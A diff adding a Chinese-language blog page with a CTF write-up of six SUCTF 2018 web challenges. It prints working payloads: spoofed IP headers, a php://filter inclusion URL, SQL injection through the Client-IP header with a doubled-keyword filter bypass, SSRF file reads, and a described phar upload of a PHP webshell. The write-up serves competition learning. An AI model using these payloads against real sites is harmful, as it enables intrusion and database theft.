@@ -1,0 +1,851 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="ctf,WP," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="web1-where are you from level1题目：where are you from? 打开网址我们可以看到只有ip为127.0.0.1才能拿到flag 1only guest from 127.0.0.1 can get flag of level1 我们可以伪造ip，伪造ip的方法有XFF，x-client-ip。。。。。 1234Client-Ip: 127.0.0.1X-">
+<meta name="keywords" content="ctf,WP">
+<meta property="og:type" content="article">
+<meta property="og:title" content="suctf-部分web题WP">
+<meta property="og:url" content="http://yoursite.com/2018/11/14/SUCTF2018_WP/index.html">
+<meta property="og:site_name" content="锯沫的小窝">
+<meta property="og:description" content="web1-where are you from level1题目：where are you from? 打开网址我们可以看到只有ip为127.0.0.1才能拿到flag 1only guest from 127.0.0.1 can get flag of level1 我们可以伪造ip，伪造ip的方法有XFF，x-client-ip。。。。。 1234Client-Ip: 127.0.0.1X-">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://img.5am3.com/img/20181119/S02fsQXeOUka.png">
+<meta property="og:image" content="http://img.5am3.com/img/20181119/qFgSXnrKGaYN.png">
+<meta property="og:image" content="http://img.5am3.com/img/20181119/NHcqPslgWcq4.png">
+<meta property="og:image" content="http://img.5am3.com/img/20181119/eiyLwYdhMSvN.png">
+<meta property="og:image" content="c:/Users/CHEN/AppData/Local/Temp/1541760770946.png">
+<meta property="og:image" content="http://img.5am3.com/img/20181119/1YVSGt87dP1W.png">
+<meta property="og:image" content="http://img.5am3.com/img/20181119/yTI3k4CTBo55.png">
+<meta property="og:image" content="http://img.5am3.com/img/20181119/f90ofIs3reng.png">
+<meta property="og:image" content="http://img.5am3.com/img/20181119/GG5StDW6gXy2.png">
+<meta property="og:image" content="http://img.5am3.com/img/20181119/8yvjncEe6lrV.png">
+<meta property="og:image" content="http://img.5am3.com/img/20181119/quUv6bXEsYb5.png">
+<meta property="og:image" content="http://img.5am3.com/img/20181119/mKtKgUWfMcRl.png">
+<meta property="og:image" content="http://img.5am3.com/img/20181119/2hjDwqq4e4Pw.png">
+<meta property="og:image" content="http://img.5am3.com/img/20181119/7nVvlKXWKA1W.png">
+<meta property="og:image" content="http://img.5am3.com/img/20181119/213VOtirMlfr.png">
+<meta property="og:updated_time" content="2018-11-19T11:15:48.163Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="suctf-部分web题WP">
+<meta name="twitter:description" content="web1-where are you from level1题目：where are you from? 打开网址我们可以看到只有ip为127.0.0.1才能拿到flag 1only guest from 127.0.0.1 can get flag of level1 我们可以伪造ip，伪造ip的方法有XFF，x-client-ip。。。。。 1234Client-Ip: 127.0.0.1X-">
+<meta name="twitter:image" content="http://img.5am3.com/img/20181119/S02fsQXeOUka.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/11/14/SUCTF2018_WP/"/>
+
+
+
+
+
+  <title>suctf-部分web题WP | 锯沫的小窝</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+    <a href="https://ch3nie.github.io/"><img style="position: absolute; top: 0; left: 0; border: 0;" src="https://s3.amazonaws.com/github/ribbons/forkme_left_white_ffffff.png" alt="Fork me on GitHub"></a>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">锯沫的小窝</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-search">
+          <a href="/search" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/14/SUCTF2018_WP/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="句末">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/blog-logo.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="锯沫的小窝">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">suctf-部分web题WP</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-14T09:57:29+08:00">
+                2018-11-14
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ARP/" itemprop="url" rel="index">
+                    <span itemprop="name">ARP</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="web1-where-are-you-from-level1"><a href="#web1-where-are-you-from-level1" class="headerlink" title="web1-where are you from level1"></a>web1-where are you from level1</h2><p>题目：where are you from?</p>
+<p>打开网址我们可以看到只有ip为127.0.0.1才能拿到flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">only guest from 127.0.0.1 can get flag of level1</span><br></pre></td></tr></table></figure>
+<p>我们可以伪造ip，伪造ip的方法有XFF，x-client-ip。。。。。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Client-Ip: 127.0.0.1</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Referer: www.google.com</span><br></pre></td></tr></table></figure>
+<p><img src="http://img.5am3.com/img/20181119/S02fsQXeOUka.png" alt="mark"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SUCTF&#123;X_F0rw4rd3d_F0r_7O_cHe4t_5eV3r&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="web2-include-me"><a href="#web2-include-me" class="headerlink" title="web2-include me"></a>web2-include me</h2><p>题目：index!index!index!</p>
+<p>看题目就可以知道这道题是文件包含include，我们用php://filter:这个语句用来查看源码。直接包含php文件时会被解析，不能看到源码，所以用filter来读取，不过要先base64加密传输,我们把index文件包含进来，然后得到base64加密后的源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://49.4.68.67:88/?lang=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure>
+<p>把base64加密后的源码进行解密，从源码中得到flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#base64加密后的数据</span><br><span class="line"></span><br><span class="line">PD9waHANCmlmKGlzc2V0KCRfR0VUWyJsYW5nIl0pKXsgIA0KICAgICRsYW5nPSRfR0VUWyJsYW5nIl07ICANCn1lbHNleyAgDQogICAgJGxhbmc9ImNuLnBocCI7ICANCn0gIA0KPz4gDQo8Zm9ybT4gIA0KPHNlbGVjdCBzdHlsZT0id2lkdGg6NjBweDsiIG5hbWU9ImxhbmciPiAgDQo8b3B0aW9uIHZhbHVlPSJjbi5waHAiPD9waHAgZWNobyAkbGFuZz09ImNuLnBocCI/InNlbGVjdGVkIjoiIjs/Pj5DaGluZXNlPC9vcHRpb24+ICANCjxvcHRpb24gdmFsdWU9ImVuLnBocCI8P3BocCBlY2hvICRsYW5nPT0iZW4ucGhwIj8ic2VsZWN0ZWQiOiIiOz8+PkVuZ2xpc2g8L29wdGlvbj4NCjxvcHRpb24gdmFsdWU9ImtyLnBocCI8P3BocCBlY2hvICRsYW5nPT0ia3IucGhwIj8ic2VsZWN0ZWQiOiIiOz8+Pg0KS29yZWFuPC9vcHRpb24+DQo8b3B0aW9uIHZhbHVlPSJqcC5waHAiPD9waHAgZWNobyAkbGFuZz09ImpwLnBocCI/InNlbGVjdGVkIjoiIjs/Pj5KYXBhbmVzZTwvb3B0aW9uPg0KPG9wdGlvbiB2YWx1ZT0iZGUucGhwIjw/cGhwIGVjaG8gJGxhbmc9PSJkZS5waHAiPyJzZWxlY3RlZCI6IiI7Pz4+R2VybWFuPC9vcHRpb24+DQo8b3B0aW9uIHZhbHVlPSJmci5waHAiPD9waHAgZWNobyAkbGFuZz09ImZyLnBocCI/InNlbGVjdGVkIjoiIjs/Pj5GcmVuY2g8L29wdGlvbj4NCjxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJjaGFuZ2UgbGFuZ3VhZ2UiPiAgDQo8L2Zvcm0+IA0KPD9waHANCiRmbGFnPSJTVUNURntoYV9oYV9oYV95b3Vfd2lufSI7DQoJaW5jbHVkZSAkbGFuZzsNCj8+DQoNCg== </span><br><span class="line"></span><br><span class="line">#base64解密后的数据</span><br><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&quot;lang&quot;]))&#123;  </span><br><span class="line">    $lang=$_GET[&quot;lang&quot;];  </span><br><span class="line">&#125;else&#123;  </span><br><span class="line">    $lang=&quot;cn.php&quot;;  </span><br><span class="line">&#125;  </span><br><span class="line">?&gt; </span><br><span class="line">&lt;form&gt;  </span><br><span class="line">&lt;select style=&quot;width:60px;&quot; name=&quot;lang&quot;&gt;  </span><br><span class="line">&lt;option value=&quot;cn.php&quot;&lt;?php echo $lang==&quot;cn.php&quot;?&quot;selected&quot;:&quot;&quot;;?&gt;&gt;Chinese&lt;/option&gt;  </span><br><span class="line">&lt;option value=&quot;en.php&quot;&lt;?php echo $lang==&quot;en.php&quot;?&quot;selected&quot;:&quot;&quot;;?&gt;&gt;English&lt;/option&gt;</span><br><span class="line">&lt;option value=&quot;kr.php&quot;&lt;?php echo $lang==&quot;kr.php&quot;?&quot;selected&quot;:&quot;&quot;;?&gt;&gt;</span><br><span class="line">Korean&lt;/option&gt;</span><br><span class="line">&lt;option value=&quot;jp.php&quot;&lt;?php echo $lang==&quot;jp.php&quot;?&quot;selected&quot;:&quot;&quot;;?&gt;&gt;Japanese&lt;/option&gt;</span><br><span class="line">&lt;option value=&quot;de.php&quot;&lt;?php echo $lang==&quot;de.php&quot;?&quot;selected&quot;:&quot;&quot;;?&gt;&gt;German&lt;/option&gt;</span><br><span class="line">&lt;option value=&quot;fr.php&quot;&lt;?php echo $lang==&quot;fr.php&quot;?&quot;selected&quot;:&quot;&quot;;?&gt;&gt;French&lt;/option&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; value=&quot;change language&quot;&gt;  </span><br><span class="line">&lt;/form&gt; </span><br><span class="line">&lt;?php</span><br><span class="line">$flag=&quot;SUCTF&#123;ha_ha_ha_you_win&#125;&quot;;</span><br><span class="line">	include $lang;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="http://img.5am3.com/img/20181119/qFgSXnrKGaYN.png" alt="mark"></p>
+<h2 id="web3-where-are-you-from-level2"><a href="#web3-where-are-you-from-level2" class="headerlink" title="web3-where are you from level2"></a>web3-where are you from level2</h2><p>题目：where are you from? this is level2,try to find vul.</p>
+<p>这个题还是先构造了client-ip之后发现只有leave1的flag，但是我们拿到了源码</p>
+<p><img src="http://img.5am3.com/img/20181119/NHcqPslgWcq4.png" alt="mark"></p>
+<p>我们分析一下该题的源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getIp</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($_SERVER[<span class="string">'HTTP_CLIENT_IP'</span>]))&#123;</span><br><span class="line">        $cip=$_SERVER[<span class="string">'HTTP_CLIENT_IP'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span>(!<span class="keyword">empty</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]))&#123;</span><br><span class="line">        $cip=$_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span>(!<span class="keyword">empty</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>]))&#123;</span><br><span class="line">        $cip=$_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        $cip=<span class="string">''</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $cip=preg_replace(<span class="string">'/\s|select|from|limit|union|join/iU'</span>,<span class="string">''</span>,$cip);</span><br><span class="line">    <span class="keyword">return</span> $cip;</span><br><span class="line">&#125;</span><br><span class="line"> $query=$mysqli-&gt;query(<span class="string">"insert into ip_records(ip,time) values ('$ip','$time')"</span>);</span><br></pre></td></tr></table></figure>
+<p>client-ip注入，而且是加了过滤的注入，过滤是直接把关键字给替换成空，而且也没有循环匹配，所以我们可以用双写来绕过过滤。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">client-ip: 127.0.0.1&apos;,database())#</span><br></pre></td></tr></table></figure>
+<p>我们得到了数据库的名字是demo2</p>
+<p><img src="http://img.5am3.com/img/20181119/eiyLwYdhMSvN.png" alt="mark"></p>
+<p>然后拿到表名flaaag,ip_records</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">client-ip: 127.0.0.1&apos;,(selselectect/**/group_concat(table_name)/**/frfromom/**/information_schema.tables/**/where/**/table_schema=&apos;demo2&apos;))#</span><br></pre></td></tr></table></figure>
+<p>然后现在注出来字段名id,fl4g</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">client-ip: 127.0.0.1&apos;,(selselectect/**/group_concat(column_name)/**/frfromom/**/information_schema.columns/**/where/**/table_name=&apos;flaaag&apos;))#</span><br></pre></td></tr></table></figure>
+<p>然后，嗯，就可以拿到flag了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">client-ip: 127.0.0.1&apos;,(selselectect/**/fl4g/**/frfromom/**/flaaag))#</span><br></pre></td></tr></table></figure>
+<p><img src="C:\Users\CHEN\AppData\Local\Temp\1541760770946.png" alt="1541760770946"></p>
+<h2 id="web4-onepiece"><a href="#web4-onepiece" class="headerlink" title="web4-onepiece"></a>web4-onepiece</h2><p>题目：onepiece是真实存在的</p>
+<p>进去之后只有一个界面，用了phpstorm，robots.txt没有</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phpstorm,我用了phpstorm</span><br></pre></td></tr></table></figure>
+<p>试了一下发现存在文件泄露.idea目录泄露</p>
+<p><img src="http://img.5am3.com/img/20181119/1YVSGt87dP1W.png" alt="mark"></p>
+<p>在workspace.xml文档里发现该网站有/index.php     /UpL0ad.php还有/README.html</p>
+<p><img src="http://img.5am3.com/img/20181119/yTI3k4CTBo55.png" alt="mark"></p>
+<p>看到/UpL0ad.php首先想到是文件上传的题，但是上传了一个文件试了试并没有什么用，然后看看README.html里面是一张图片，而且一个提示，有一个onepiece.zip的压缩包</p>
+<p><img src="http://img.5am3.com/img/20181119/f90ofIs3reng.png" alt="mark"></p>
+<p>发现一个压缩包，这个题的名字也是onepiece，把压缩包载下来里面是一个php文件，源码是加过密的，同学昨天花钱解的密，我就没有解，源码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>)</span><br><span class="line">header(<span class="string">"Content-Type: text/html;charset=utf-8"</span>)</span><br><span class="line">$flag = <span class="string">"**********"</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'file'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">	$filename = $_POST[<span class="string">'file'</span>];</span><br><span class="line">	<span class="keyword">echo</span> $$filename;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>文件上传界面上传的参数就是file，传过去的存入变量filename，源码中我们知道只要让$$filename=$flag，就可以输出flag，也就是$filename=flag，也就是直接传入flag，flag存入$filename，就可以拿到flag</p>
+<p><img src="http://img.5am3.com/img/20181119/GG5StDW6gXy2.png" alt="mark"></p>
+<h2 id="web5-yunpan"><a href="#web5-yunpan" class="headerlink" title="web5-yunpan"></a>web5-yunpan</h2><p>题目：heiheihei,how to hack this yunpan?</p>
+<p>昨天跑了一遍目录就去看电影了，回来接着做</p>
+<p><img src="http://img.5am3.com/img/20181119/8yvjncEe6lrV.png" alt="mark"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#/readme.txt</span><br><span class="line">嘤嘤嘤，我怎么可能直白的把flag.php上传到云盘呢，这下看你怎么拿到flag.php，嘤嘤嘤</span><br><span class="line"></span><br><span class="line"># /flag.php</span><br><span class="line">厉害啊，你竟然能找到这里，然而flag在哪里呢，hiahiahia！</span><br><span class="line"></span><br><span class="line">#/download.php</span><br><span class="line">Access Forbidden!</span><br><span class="line">小明:你这个大黑阔！就会欺负人，嘤嘤嘤QAQ</span><br></pre></td></tr></table></figure>
+<p>但是就没有其他发现了，后来看源码的时候突然注意到我是不是可以直接下载flag.php呢</p>
+<p><img src="http://img.5am3.com/img/20181119/quUv6bXEsYb5.png" alt="mark"></p>
+<p>然后我构造了下面这个下载链接，果然，把flag.php载下来了，而且flag就在里面</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://49.4.68.67:90/download.php?file=ZmxhZy5waHA=</span><br></pre></td></tr></table></figure>
+<p><img src="http://img.5am3.com/img/20181119/mKtKgUWfMcRl.png" alt="mark"></p>
+<p><img src="http://img.5am3.com/img/20181119/2hjDwqq4e4Pw.png" alt="mark"></p>
+<h2 id="web6-gallery"><a href="#web6-gallery" class="headerlink" title="web6-gallery"></a>web6-gallery</h2><p>题目：A Simple Gallery. Be careful about tips!</p>
+<p>随便上传一个文件抓包发现cookie里有个hint</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hint=cGxlYXNlIHJlYWQgcmVjZW50IHBhcGVycyBhYm91dCBwaGFy</span><br><span class="line"></span><br><span class="line">#base64解码得到</span><br><span class="line">please read recent papers about phar</span><br></pre></td></tr></table></figure>
+<p>既然是phar那可能是远程文件包含了，可是我没有办法知道上传文件的路径，然后扫了一遍目录发现有两个可以正常访问的路径</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[11:14:28] 200 -    2KB - /index.php</span><br><span class="line">[11:14:28] 200 -    2KB - /index.php/login/</span><br></pre></td></tr></table></figure>
+<p><img src="http://img.5am3.com/img/20181119/7nVvlKXWKA1W.png" alt="mark"></p>
+<p>然后我在/index.php/login/页面看了一下，发现在这个页面上传文件之后可以查看图像，从而知道路径，如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://49.4.68.67:86/?act=get&amp;pic=/var/www/html/sandbox/b1fde77fa365ca152d1639208fc19d3c/4a47a0db6e60853dedfcfdf08a5ca249.png</span><br></pre></td></tr></table></figure>
+<p>然后发现查看图像这里还可以利用SSRF把index.php源码载下来了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://49.4.68.67:86/?act=get&amp;pic=/var/www/html/index.php</span><br></pre></td></tr></table></figure>
+<p>这里上传图片文件，而且提示我们可以用phar协议(当然zip伪协议，php协议等在做这类题时也是常用的)。然后我们现在写一个php的马，然后压缩成zip，在改为.png的后缀，上传之后访问该图片，利用phar协议包含一句话木马，这里。。。直接访问马就出现了加密过的flag，然后解密</p>
+<p><img src="http://img.5am3.com/img/20181119/213VOtirMlfr.png" alt="mark"></p>
+<p>最后flag为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SUCTF&#123;phar_s3rial1ze_f4nt4s71C&#125;</span><br></pre></td></tr></table></figure>
+<hr>
+<p>就前面两天看了看题，后面就在忙其他的，有些做题记录没有存，而且后面的题就没看，所以只写了这部分</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/ctf/" rel="tag"># ctf</a>
+          
+            <a href="/tags/WP/" rel="tag"># WP</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/11/05/上海杯WP/" rel="next" title="2018上海杯WP">
+                <i class="fa fa-chevron-left"></i> 2018上海杯WP
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/11/18/HEBTUCTF2018-WEB/" rel="prev" title="HEBTUCTF2018-WEB-WP">
+                HEBTUCTF2018-WEB-WP <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/blog-logo.png"
+                alt="句末" />
+            
+              <p class="site-author-name" itemprop="name">句末</p>
+              <p class="site-description motion-element" itemprop="description">会划水和摸鱼的皮皮怪</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">15</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
